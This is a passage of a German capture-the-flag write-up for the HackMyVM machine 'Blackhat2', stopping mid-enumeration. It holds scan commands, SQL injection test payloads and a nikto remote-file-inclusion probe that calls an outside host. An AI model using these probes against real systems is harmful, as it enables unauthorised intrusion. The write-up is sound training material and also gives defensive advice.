@@ -1,0 +1,1071 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blackhat2 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Blackhat2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <!-- HINWEIS: Klasse 'level-medium' wird verwendet, um GELB gemäß Anforderung zu erzwingen -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle level-medium-circle"> <!-- Zusätzliche Klasse für CSS-Targeting der Kreis-Farbe -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrund wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">cmake</div>
+                <div class="tool-item">make</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">dmesg</div>
+                <div class="tool-item">sysctl</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">ExploitGSM (DirtyCred)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#vulnerability-analysis">Vulnerability Analysis (LFI/RCE)</a></li>
+                 <li><a href="#initial-access">Initial Access (RCE via PHP Filter Chain)</a></li>
+                 <li><a href="#privilege-escalation">Privilege Escalation (Kernel Exploit - DirtyCred)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`. Dieses Tool sendet ARP-Anfragen, um IP- und MAC-Adressen von Geräten im selben Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `arp-scan` findet erfolgreich ein Zielsystem mit der IP-Adresse `192.168.2.118`. Die zugehörige MAC-Adresse `08:00:27:5c:2d:85` gehört laut OUI-Lookup (PCS Systemtechnik GmbH) zu Oracle VirtualBox, was darauf hindeutet, dass es sich um eine virtuelle Maschine handelt. Dies ist die primäre IP für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP `192.168.2.118` als Ziel für detailliertere Scans (Nmap, etc.) verwenden. Die MAC-Adresse notieren, bestätigt die Virtualisierungsumgebung.<br><strong>Empfehlung (Admin):</strong> Netzwerkmonitoring implementieren, um ARP-Scans zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.118</span>	<span class="command">08:00:27:5c:2d:85</span>	<span class="command">PCS Systemtechnik GmbH</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Die lokale Hosts-Datei (`/etc/hosts`) wird mit dem Texteditor `vi` bearbeitet, um der gefundenen IP-Adresse `192.168.2.118` den Hostnamen `blackhat2.hmv` zuzuordnen. Dies vereinfacht die Ansprache des Ziels in nachfolgenden Schritten, insbesondere bei Webanwendungen. Die umfangreiche Liste auskommentierter Einträge zeigt frühere Arbeiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Standardprozedur, um die lokale Namensauflösung für das Ziel sicherzustellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer die Hosts-Datei pflegen, wenn mit festen IPs gearbeitet wird, um potenzielle Probleme mit virtuellen Hosts oder Zertifikaten zu vermeiden.<br><strong>Empfehlung (Admin):</strong> Keine serverseitigen Maßnahmen gegen lokale Hosts-Datei-Manipulation möglich. Sicherstellen, dass Serverkonfigurationen, die auf Hostnamen basieren, korrekt und dokumentiert sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+
+        #       192.168.2.104   zon.hmv  
+        #       192.168.2.105   king.vln
+        #       192.168.2.106   avengers.vln
+        #       192.168.2.107   slackware
+        #       192.168.2.108   library.vln
+        #       192.168.2.109	lampiano.vln
+        #       192.168.2.110   nebula.hmv
+        #       192.168.2.111   pyrat.hmv
+        #       192.168.2.112   easy.vln skymbu.info
+        #       192.168.2.113   liceo.hmv
+        #       192.168.2.114   azer.hmv
+        #       192.168.2.115   gemini.vln
+        #       192.168.2.116	immortal.hmv   
+        #       192.168.2.117   gibson.vln
+                <span class="command">192.168.2.118   blackhat2.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein `nmap`-Scan wird durchgeführt. Zuerst wird die gefilterte Ausgabe mit `grep open` gezeigt, dann die vollständige Ausgabe.
+                *   `-sS`: SYN-Scan (Stealth).
+                *   `-sV`: Versionserkennung.
+                *   `-A`: Aggressiver Scan (OS, Version, Skripte, Traceroute).
+                *   `-O`: OS-Erkennung (Teil von `-A`).
+                *   `-T5`: Sehr schnelles Timing.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22 (SSH):** Läuft OpenSSH 9.2p1 (Debian 12). Ein moderner SSH-Server.
+                *   **Port 80 (HTTP):** Läuft Apache 2.4.57 (Debian). Die Webseite hat den Titel "Home - Hacked By sML", was auf eine mögliche vorherige Kompromittierung oder ein Defacement hindeutet.
+            Die OS-Erkennung deutet auf ein Linux-System (Kernel 4.x/5.x) hin. Die MAC-Adresse bestätigt VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offenen Ports SSH und HTTP sind die primären Angriffsvektoren. Den Webserver auf Port 80 genauer untersuchen. Der Titel "Hacked By sML" ist verdächtig und sollte untersucht werden – ist es nur ein Titel oder gibt es Hinweise auf Backdoors oder hinterlassene Dateien? SSH für spätere Versuche vormerken.<br><strong>Empfehlung (Admin):</strong> Webserver auf Integrität prüfen, falls der Titel auf ein echtes Defacement hindeutet. Apache und OpenSSH aktuell halten und sicher konfigurieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.118 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.118 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 11:17 CEST
+Nmap scan report for blackhat2.hmv (192.168.2.118)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   256 04:2a:cb:c4:54:0e:de:54:a1:f2:61:d7:6a:29:f6:5f (ECDSA)
+|_  256 a8:02:05:f3:a6:61:7d:e8:8b:e5:6f:1c:5b:7b:5b:33 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</span>
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: <span class="command">Home - Hacked By sML</span>
+MAC Address: 08:00:27:5C:2D:85 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms blackhat2.hmv (192.168.2.118)
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird zur Untersuchung des Webservers auf bekannte Schwachstellen und interessante Dateien/Konfigurationen eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet:
+                *   Server: `Apache/2.4.57 (Debian)`.
+                *   Fehlende Security Header: `X-Frame-Options` (Clickjacking), `X-Content-Type-Options` (MIME-Sniffing).
+                *   Potenzielle Inode-Leakage über ETags (CVE-2003-1418).
+                *   Erlaubte HTTP-Methoden: `GET, POST, OPTIONS, HEAD`.
+                *   Ein Cookie `PHPSESSID` wird ohne das `HttpOnly`-Flag gesetzt (gefunden über einen Test-RFI-Payload auf `news.php`). Dies deutet auf die Existenz von `news.php` und die Verwendung von PHP hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header und das unsichere Cookie notieren. Die Datei `news.php` genauer untersuchen, da Nikto sie als potenzielle Quelle für das Cookie identifiziert hat. Die ETag-Leakage ist meist von geringem Risiko.<br><strong>Empfehlung (Admin):</strong> Fehlende Security Header implementieren. Cookies mit `HttpOnly` und `Secure` Flags versehen. ETag-Header ggf. anpassen (`FileETag None`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.118</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.118
++ Target Hostname:    192.168.2.118
++ Target Port:        80
++ Start Time:         2024-05-02 11:18:05 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Debian)</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The <span class="command">X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 3e4, size: 61245689d1f53, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /news.php?CONFIG[script_path]=http://blog.cirt.net/rfiinc.txt?: Cookie <span class="command">PHPSESSID created without the httponly flag</span>. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2024-05-02 11:18:16 (GMT2) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `dirb` wird verwendet, um nach Verzeichnissen und Dateien zu suchen. Es ist ein weiteres Tool für Directory Brute-Forcing.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `dirb` findet:
+                *   `index.html` (Status 200)
+                *   `index.php` (Status 200)
+                *   `server-status` (Status 403 Forbidden). Apache `server-status` ist konfiguriert, aber der Zugriff ist verboten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt die Existenz von `index.html` und `index.php`. Der verbotene Zugriff auf `server-status` ist normal und sicherheitsbewusst.<br><strong>Empfehlung (Admin):</strong> Zugriff auf `server-status` und `server-info` sollte immer auf interne IPs oder authentifizierte Benutzer beschränkt sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">dirb http://blackhat2.hmv</span></div>
+                     <pre>
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu May  2 11:18:35 2024
+URL_BASE: http://blackhat2.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://blackhat2.hmv/ ----
++ <span class="command">http://blackhat2.hmv/index.html</span> (CODE:200|SIZE:996)                                        
++ <span class="command">http://blackhat2.hmv/index.php</span> (CODE:200|SIZE:996)                                         
++ <span class="command">http://blackhat2.hmv/server-status</span> (CODE:403|SIZE:278)                                   
+                                                                                
+---- Entering directory: http://blackhat2.hmv/icons/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                
+-----------------
+END_TIME: Thu May  2 11:18:40 2024
+DOWNLOADED: 4612 - FOUND: 3
+</pre> <!-- Hinweis: dirb fand /icons/ als listbar, was in gobuster nicht auftaucht -->
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut verwendet, mit einer umfangreichen Liste von Endungen und Filtern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet zusätzlich zu `index.php` und `index.html`:
+                *   `news.php` (Status 200). Dies bestätigt den Fund von Nikto.
+                *   `dp.jpg` (Bilddatei).
+                *   Mehrere Dateien/Pfade, die wie Jahreszahlen aussehen: `2021`, `2022`, `2023` (Status 200). Dies könnte auf archivierte Inhalte hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> **`news.php` ist das vielversprechendste Ziel.** Untersuchen, welche Parameter es akzeptiert und ob es anfällig für SQL-Injection, LFI/RFI oder andere Schwachstellen ist. Die Jahreszahlen-Pfade untersuchen, ob sie interessante Inhalte bergen.<br><strong>Empfehlung (Admin):</strong> Die Sicherheit von `news.php` überprüfen und härten. Sicherstellen, dass keine unnötigen oder alten Archive über das Web zugänglich sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">gobuster dir -u http://blackhat2.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+==============================================================================================================================
+<span class="command">http://blackhat2.hmv/index.php</span>            (Status: 200) [Size: 996]
+<span class="command">http://blackhat2.hmv/index.html</span>           (Status: 200) [Size: 996]
+<span class="command">http://blackhat2.hmv/news.php</span>             (Status: 200) [Size: 3418]
+<span class="command">http://blackhat2.hmv/dp.jpg</span>               (Status: 200) [Size: 238753]
+<span class="command">http://blackhat2.hmv/2021</span>                 (Status: 200) [Size: 31875]
+<span class="command">http://blackhat2.hmv/2022</span>                 (Status: 200) [Size: 34213]
+<span class="command">http://blackhat2.hmv/2023</span>                 (Status: 200) [Size: 36067]
+==============================================================================================================================
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (LFI/RCE)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine GET-Anfrage an `news.php` wird durchgeführt (vermutlich mit `curl` oder im Browser). Die Header und der Host werden angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass die Seite existiert und einen `PHPSESSID`-Cookie setzt. Dient als Basis für weitere Tests an `news.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Parameter für `news.php` identifizieren und testen.<br><strong>Empfehlung (Admin):</strong> Sicherheit von `news.php` prüfen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine HTTP-Anfrage/Analyse ist -->
+                     <pre>
+GET    http://blackhat2.hmv/news.php
+ 
+ 
+Server Apache/2.4.57 (Debian)
+ 
+Cookie PHPSESSID=m9bvbnajfkp2ku855ulpd1cs6q
+Host   blackhat2.hmv
+</pre>
+                  </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine URL gezeigt, die einen SQL-Injection-Test-Payload (`' ORDER BY 1-- -`) an den Parameter `year` von `news.php` sendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Versuch, die Anzahl der Spalten in einer potenziell anfälligen SQL-Abfrage zu ermitteln, die vom `year`-Parameter abhängt. Das Ergebnis des Versuchs wird nicht gezeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systematisch auf SQL-Injection im `year`-Parameter testen (Error-Based, Union-Based, Blind). Tools wie `sqlmap` verwenden.<br><strong>Empfehlung (Admin):</strong> Prepared Statements und parametrisierte Abfragen verwenden, um SQL-Injection zu verhindern. Eingaben validieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da dies eine URL ist -->
+                    <pre>
+<span class="command">http://blackhat2.hmv/news.php?year=2022%27%20ORDER%20BY%201--%20-</span>
+</pre>
+                 </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird verwendet, um automatisiert nach SQL-Injection-Schwachstellen zu suchen. Der Request wird aus einer Datei (`ben1.sql` - Inhalt nicht gezeigt, enthält aber wahrscheinlich den vorherigen Request) geladen. `--dbs` soll Datenbanknamen auflisten, `--batch` bestätigt Standardoptionen, `--level 3 --risk 3` erhöht die Intensität der Tests.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sqlmap` meldet `<span class="password">[CRITICAL] all tested parameters do not appear to be injectable</span>`. Der Versuch, SQL-Injection automatisiert zu finden, ist fehlgeschlagen. Dies schließt eine SQLi nicht vollständig aus, macht sie aber unwahrscheinlicher oder erfordert komplexere Umgehungstechniken.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SQL-Injection vorerst zurückstellen oder manuelle Tests mit anderen Payloads versuchen. Andere Parameter und Angriffspunkte (wie LFI/RFI) in `news.php` untersuchen.<br><strong>Empfehlung (Admin):</strong> Auch wenn `sqlmap` fehlschlägt, ist die Verwendung von sicheren Datenbankabfragen (Prepared Statements) unerlässlich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">sqlmap -r /home/cyber/Downloads/ben1.sql --dbs --batch --level 3 --risk 3</span></div>
+                     <pre>
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.3#dev}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:06:32 /2024-05-02/
+
+[12:06:32] [INFO] parsing HTTP request from '/home/cyber/Downloads/ben1.sql'
+[12:06:32] [INFO] testing connection to the target URL
+[12:06:32] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:06:33] [INFO] testing if GET parameter 'year' is dynamic
+[12:06:33] [INFO] confirming that GET parameter 'year' is dynamic
+[12:06:33] [INFO] GET parameter 'year' is dynamic
+[12:06:33] [INFO] heuristic (basic) test shows that GET parameter 'year' might not be injectable
+[12:06:33] [INFO] testing for SQL injection on GET parameter 'year'
+[12:06:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:06:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:06:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[12:06:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[12:06:33] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[12:06:33] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[12:06:33] [INFO] testing 'SAP MaxDB AND error-based - WHERE or HAVING clause'
+[12:06:33] [INFO] testing 'Apache Derby AND error-based - WHERE or HAVING clause'
+[12:06:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[12:06:33] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[12:06:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[12:06:33] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[12:06:33] [WARNING] parameter 'Referer' does not seem to be injectable
+<span class="password">[12:06:33] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'</span>
+
+[*] ending @ 12:06:33 /2024-05-02/
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der HTML-Quellcode von `news.php?year=2022` (abgerufen mit `curl` und dem Session-Cookie) wird teilweise angezeigt. Er enthält ein Dropdown-Menü für das Jahr, eine Textarea für "Events" und einen Button "Send by email".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt die Struktur der Seite. Die Textarea und der E-Mail-Button könnten interessant sein, aber der Fokus scheint auf den URL-Parametern zu liegen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Parameter neben `year` suchen und testen.<br><strong>Empfehlung (Admin):</strong> Code-Review von `news.php` durchführen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">curl -s -b "PHPSESSID=m9bvbnajfkp2ku855ulpd1cs6q" "http://blackhat2.hmv/news.php?year=2022"</span></div>
+                     <pre>
+ 
+...
+...
+...
+
+December 29 – Brazilian football legend Pelé dies at the age of 82, with his funeral being held at the Vila Belmiro stadium in Santos.[275][276]
+December 31 – Former Pope Benedict XVI dies at the age of 95, with his funeral being held in St. Peter's Square, presided over by Pope Francis
+ and Cardinal Giovanni Battista Re.[277][278]
+ <br>
+            
+           onclick="alert(' Events have been sent by email.');" Send by email .... button
+ 
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies SQL-Beispiele sind -->
+                     <pre>
+select * from database where id = 444
+select * from database where id = 444 and sleep(5)
+select * from database where id = 444 and 1=1
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach zusätzlichen GET-Parametern für `news.php` zu suchen. `--hh 3418` filtert Antworten heraus, die dieselbe Größe wie die normale Seite ohne zusätzlichen Parameter haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet einen interessanten Parameter: `email`. Wenn `news.php?email=id` aufgerufen wird, ändert sich die Antwortgröße (3911 Chars statt 3418 Chars). Dies deutet darauf hin, dass der `email`-Parameter von der Anwendung verarbeitet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den `email`-Parameter genauer untersuchen. Auf SQL-Injection, Command Injection, LFI/RFI oder XSS testen.<br><strong>Empfehlung (Admin):</strong> Alle Eingabeparameter validieren und sanitisieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://blackhat2.hmv/news.php?FUZZ=id" --hc 404 --hh 3418</span></div>
+                     <pre> 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://blackhat2.hmv/news.php?FUZZ=id
+Total requests: 220547
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+<span class="password">000000121:   200        149 L    296 W      3911 Ch     "email"</span>                                                                                                                      
+
+=====================================================================
+
+Total time: 0
+Processed Requests: 220547
+Filtered Requests: 220546
+Requests/sec.: 0
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Seite wird angezeigt, nachdem sie mit einem manipulierten `email`-Parameter aufgerufen wurde (`email=ben@hacker.de%27--%20-`). Der Payload (`'-- -`) ist ein typischer SQL-Injection-Kommentarversuch.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der eingefügte Payload erscheint reflektiert im HTML-Quellcode: `<p class="text2">Email : ben@hacker.de'-- -</p>`. Die einfachen Anführungszeichen wurden zu `'` HTML-kodiert. Dies verhindert einfache SQL-Injection, könnte aber auf eine XSS-Schwachstelle hindeuten, wenn andere Zeichen nicht gefiltert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Reflected XSS im `email`-Parameter testen. Da SQLi unwahrscheinlich ist, den Fokus auf LFI/RFI oder Command Injection in den Parametern `year` und `email` legen.<br><strong>Empfehlung (Admin):</strong> Ausgaben immer kontextbezogen kodieren (hier HTML-Kodierung), um XSS zu verhindern. Eingaben validieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies Quellcode ist -->
+                     <pre>
+view-source:http://blackhat2.hmv/news.php?email=ben@hacker.de%27--%20-
+
+ 
+                    <p class="text2">Email : <span class="password">ben@hacker.de&#039;-- -</span></p>
+            
+                Choose a year : 
+          
+                    2023 <br>
+                    2022 <br>
+                    2021 <br>
+          onclick="alert(' Events have been sent by email.');" class="textbox">Send by email</button>
+           
+ 
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneuter `wfuzz`-Scan, um weitere Parameter zu finden, diesmal mit bereits gesetzten Parametern `year` und `email`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt, dass nur `email` und `year` die Antwortgröße signifikant ändern. Es werden keine weiteren relevanten GET-Parameter gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentration auf die Parameter `year` und `email` für LFI/RFI-Tests.<br><strong>Empfehlung (Admin):</strong> Code überprüfen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://blackhat2.hmv/news.php?year=2022&email=sml@hackmyvm.eu&FUZZ=id" --hc 404 --hh 37788</span></div>
+                     <pre> 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://blackhat2.hmv/news.php?year=2022&email=sml@hackmyvm.eu&FUZZ=id
+Total requests: 220547
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+<span class="command">000000121:   200        399 L    5497 W     37775 Ch    "email"</span>                                                                                                                      
+<span class="command">000003221:   200        149 L    296 W      3924 Ch     "year"</span>                                                                                                                       
+
+=====================================================================
+
+Total time: 563.7579
+Processed Requests: 220547
+Filtered Requests: 220545
+Requests/sec.: 391.2086
+</pre>
+                  </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ffuf -u 'http://blackhat2.hmv/news.php?year=2022&FUZZ=ls' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 3418</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blackhat2.hmv/news.php?year=2022&FUZZ=ls
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3418
+________________________________________________
+
